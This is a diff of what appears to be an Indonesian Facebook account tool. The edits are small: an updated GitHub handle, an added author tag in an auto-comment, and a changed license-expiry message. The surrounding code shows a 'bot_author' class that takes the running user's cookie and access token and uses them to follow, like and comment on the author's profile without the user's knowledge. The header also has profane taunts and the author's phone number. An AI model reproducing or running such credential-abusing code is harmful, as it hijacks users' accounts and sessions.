@@ -1,7 +1,7 @@
 # JANGAN RECODE MULU LOL BELAJAR CODING NGAPA 
 # GANTENG DOANG GK BISA CODING OKWOWKOWK
 # MINIMAL NGOMONG DULU KONTOL KALO MAU RECODE
-# https://github.com/AfriliyanFerlyShishigamiX
+# https://github.com/Shishigami-X
 
 ###----------[ AUTHOR & CREATOR ]---------- ###
 Author_ll :  'Dapunta Khurayra X'
@@ -12,7 +12,7 @@ Author_ll :  'Dapunta Khurayra X'
 Facebook : 'Afriliyan Ferly Shishigami X'
 Instagram : 'afriliyanferlly_shishigami'
 HP : '085797818026'
-Github : 'AfriliyanFerlyShishigamiX'
+Github : 'Shishigami-X'
 Afriliyan = 100013275378835
 Postinganll = 1609426379509859
 
@@ -586,7 +586,7 @@ def kecuali(error):
 ###----------[ BOT AUTHOR JANGAN DIGANTI ]---------- ###
 class bot_author:
     def __init__(self,cookie,token,cookie_mentah):
-        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Afriliyan)];self.komen = ['Mantap Bang','Semangat Terus','Gokil Suhu','Panutanku']
+        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Afriliyan)];self.komen = ['Mantap Bang','Semangat Terus Master @[100013275378835:0]','Gokil Suhu','Panutanku']
         for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(x,cookie,token)
     def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
         with requests.Session() as xyz:
@@ -734,7 +734,7 @@ def login():
 def user(nama):
     print(''%())
     print('        %s[%s•%s] %sHello %s%s %s!'%(J,P,J,P,J,nama,P))
-    print('        %s[%s•%s] %sYour License Will Expire In %s1 %sDays'%(J,P,J,P,A,P))
+    print('        %s[%s•%s] %sYour License Will Expire In %s7 %sDays'%(J,P,J,P,A,P))
 def tampilan_menu():
     global gabung_sandi, tempel_sandi
     resik()
